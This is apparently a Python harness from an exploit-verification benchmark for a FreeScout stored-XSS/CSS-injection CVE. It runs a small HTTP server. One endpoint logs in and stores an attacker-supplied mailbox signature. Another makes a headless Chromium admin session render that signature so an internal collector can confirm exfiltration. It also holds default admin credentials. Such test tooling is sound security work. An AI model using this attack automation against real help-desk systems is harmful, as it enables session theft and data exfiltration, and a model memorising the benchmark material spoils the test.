#!/usr/bin/env python3
"""In-network harness for freescout-cve-2026-40497 (stored XSS / CSS-injection canary).

Runs inside the compose network so all app-facing traffic uses the same origin as
FreeScout's APP_URL (no host/URL mismatch). Exposes three HTTP endpoints the host-side
oracle drives:

  GET /save?base=<app>&mailbox=<id>&payload=<urlencoded signature HTML>
      ATTACKER step. Logs in as the agent over REAL HTTP, GETs the REAL mailbox settings
      page (POST /mailbox/settings/{id} form), and re-submits it with the malicious
      `signature` field -> the payload is stored by real FreeScout after passing through
      the running version's Helper::stripDangerousTags().

  GET /visit?base=<app>&conv=<id>
      VICTIM step. A real headless chromium (admin session) logs in and opens the REAL
      conversation view (GET /conversation/{id}). The stored signature is rendered
      unescaped by Conversation::getSignatureProcessed() into #editor_signature. If the
      injected <style>/<iframe> survived sanitization, the browser applies/loads it and
      makes a background-image / frame request to the internal collector -> exfil proven.

  GET /health -> ok
"""
import os
import http.server
import urllib.parse

import requests
from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright

ADMIN_EMAIL = os.environ.get("FS_ADMIN_EMAIL", "admin@pcb.local")
ADMIN_PASSWORD = os.environ.get("FS_ADMIN_PASSWORD", "PcbAdminPass123")

_pw = None
_browser = None


def _ensure_browser():
    global _pw, _browser
    if _browser is not None:
        return _browser
    _pw = sync_playwright().start()
    _browser = _pw.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
    return _browser


def _reset_browser():
    global _pw, _browser
    try:
        if _browser is not None:
            _browser.close()
    except Exception:
        pass
    try:
        if _pw is not None:
            _pw.stop()
    except Exception:
        pass
    _pw = None
    _browser = None


def _login_requests(s: requests.Session, base: str) -> None:
    r = s.get(base + "/login", timeout=20)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "_token"})
    token = token["value"] if token else soup.find("meta", {"name": "csrf-token"})["content"]
    s.post(
        base + "/login",
        data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "_token": token, "remember": ""},
        timeout=20,
        allow_redirects=True,
    )


def save_signature(base: str, mailbox_id: str, payload: str) -> str:
    """ATTACKER: store `payload` as the mailbox signature via the REAL settings endpoint."""
    s = requests.Session()
    _login_requests(s, base)
    url = base + "/mailbox/settings/" + str(mailbox_id)
    r = s.get(url, timeout=20)
    soup = BeautifulSoup(r.text, "html.parser")
    # Find the settings <form> that contains the signature field.
    form = None
    for f in soup.find_all("form"):
        if f.find(attrs={"name": "signature"}):
            form = f
            break
    if form is None:
        return "no-signature-form: " + str(r.status_code)
    data = {}
    for inp in form.find_all(["input", "textarea"]):
        name = inp.get("name")
        if not name:
            continue
        if inp.name == "textarea":
            data[name] = inp.text
        else:
            t = (inp.get("type") or "text").lower()
            if t in ("checkbox", "radio"):
                if inp.has_attr("checked"):
                    data[name] = inp.get("value", "1")
            else:
                data[name] = inp.get("value", "")
    for sel in form.find_all("select"):
        name = sel.get("name")
        if not name:
            continue
        opt = sel.find("option", selected=True) or sel.find("option")
        if opt is not None:
            data[name] = opt.get("value", "")
    # Inject the malicious signature.
    data["signature"] = payload
    resp = s.post(url, data=data, timeout=20, allow_redirects=False)
    # Read back what was actually stored (post-sanitizer) to report SURVIVAL vs STRIPPING.
    # IMPORTANT: never echo the stored content itself -- it contains the flag, which would let
    # the oracle "detect" the flag by reflection instead of by real execution at the collector.
    g = s.get(url, timeout=20)
    gs = BeautifulSoup(g.text, "html.parser")
    ta = gs.find(attrs={"name": "signature"})
    stored = ta.text if ta else ""
    tags = "".join(t for t in ("style", "iframe", "object", "script", "form") if "<" + t in stored.lower())
    return "save_status=%s stored_len=%d survived_tags=[%s]" % (resp.status_code, len(stored), tags)


def visit(base: str, conv_id: str) -> str:
    """VICTIM: real chromium admin session opens the conversation view (renders signature)."""
    last = "ERR:no-attempt"
    for attempt in range(2):
        try:
            browser = _ensure_browser()
            ctx = browser.new_context(ignore_https_errors=True)
            page = ctx.new_page()
            try:
                page.goto(base + "/login", wait_until="load", timeout=25000)
                page.fill("#email", ADMIN_EMAIL)
                page.fill("#password", ADMIN_PASSWORD)
                page.click("button[type=submit]")
                page.wait_for_timeout(1500)
                page.goto(base + "/conversation/" + str(conv_id), wait_until="load", timeout=25000)
                # Let injected <style> background-image / <iframe> src requests fire.
                page.wait_for_timeout(3500)
                title = page.title()
            finally:
                try:
                    ctx.close()
                except Exception:
                    pass
            return "visited conv=%s title=%r" % (conv_id, title)
        except Exception as e:
            last = "ERR:" + str(e)[:120]
            _reset_browser()
    return "visited conv=%s title=%r" % (conv_id, last)


class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.urlparse(self.path)
        p = urllib.parse.parse_qs(q.query)
        try:
            if q.path == "/save":
                out = save_signature(p["base"][0], p["mailbox"][0], p["payload"][0])
            elif q.path == "/visit":
                out = visit(p["base"][0], p["conv"][0])
            elif q.path == "/health":
                out = "ok"
            else:
                self.send_response(404); self.end_headers(); return
        except Exception as e:
            out = "EXC:" + str(e)[:200]
        body = out.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    http.server.ThreadingHTTPServer(("0.0.0.0", 8070), H).serve_forever()
